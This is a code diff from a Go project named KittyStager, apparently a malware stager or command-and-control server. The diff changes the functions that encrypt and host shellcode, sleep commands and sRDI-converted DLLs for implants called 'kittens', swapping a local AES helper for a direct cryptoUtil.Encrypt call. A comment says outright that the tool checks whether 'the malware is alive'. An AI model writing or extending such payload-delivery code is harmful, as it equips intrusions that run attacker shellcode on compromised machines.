@@ -5,7 +5,6 @@ import (
 	"KittyStager/cmd/srdi"
 	"KittyStager/cmd/util"
 	"encoding/json"
-	"errors"
 	"fmt"
 	color "github.com/logrusorgru/aurora"
 	"io/ioutil"
@@ -42,7 +41,7 @@ func HostShellcode(path string, kittenName string) error {
 
 	}
 	payload, err := json.Marshal(task)
-	shellcode, err := bytesToAES(payload, key)
+	shellcode, err := cryptoUtil.Encrypt(payload, key)
 
 	if err != nil {
 		return err
@@ -63,7 +62,7 @@ func HostSleep(t int, kittenName string) error {
 	if err != nil {
 		return err
 	}
-	sleep, err := bytesToAES(payload, key)
+	sleep, err := cryptoUtil.Encrypt(payload, key)
 	if err != nil {
 		return err
 	}
@@ -84,7 +83,7 @@ func HostDll(path, entry, kittenName string) error {
 	hexstring := fmt.Sprintf("%x ", sc)
 	task = util.Task{Tag: "shellcode", Payload: []byte(hexstring)}
 	payload, err := json.Marshal(task)
-	shellcode, err := bytesToAES(payload, key)
+	shellcode, err := cryptoUtil.Encrypt(payload, key)
 
 	if err != nil {
 		return err
@@ -93,17 +92,6 @@ func HostDll(path, entry, kittenName string) error {
 	Targets[kittenName].SetPayload(shellcode)
 	fmt.Println(color.Green("[+] Dll hosted for " + kittenName))
 	return error(nil)
-}
-
-// bytesToAES cypher the shellcode with AES
-func bytesToAES(payload []byte, key string) ([]byte, error) {
-	if len(key) != 32 {
-		return nil, errors.New("the key needs to be 32 chars long")
-	}
-	byteKey := []byte(key)
-	aesPayload, _ := cryptoUtil.Encrypt(payload, byteKey)
-	return aesPayload, nil
-
 }
 
 // CheckAlive checks if the malware is alive. If last seen is longer that the sleep time it will...
